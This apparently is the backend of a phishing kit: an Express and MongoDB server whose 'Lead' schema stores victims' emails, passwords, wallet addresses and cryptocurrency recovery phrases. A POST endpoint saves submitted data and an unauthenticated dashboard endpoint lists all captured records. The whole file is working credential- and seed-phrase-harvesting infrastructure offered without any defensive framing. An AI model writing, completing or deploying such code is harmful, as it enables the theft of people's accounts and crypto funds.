const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));

// Connect to your MongoDB
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log("Connected to MongoDB successfully"))
  .catch(err => console.error("Could not connect to MongoDB...", err));

// Define what the data looks like
const leadSchema = new mongoose.Schema({
    email: String,
    password: String,
    walletAddress: String,
    recoveryPhrase: String,
    timestamp: { type: Date, default: Date.now }
});

const Lead = mongoose.model('Lead', leadSchema);

// This is what the frontend calls to save the info
app.post('/update', async (req, res) => {
    try {
        const lead = new Lead(req.body);
        await lead.save();
        res.status(200).send("Data saved permanently.");
    } catch (err) {
        res.status(500).send("Error saving data.");
    }
});

// This is what your dashboard calls to show the info
app.get('/dashboard', async (req, res) => {
    try {
        const leads = await Lead.find().sort({ timestamp: -1 });
        res.json(leads);
    } catch (err) {
        res.status(500).send("Error fetching data.");
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
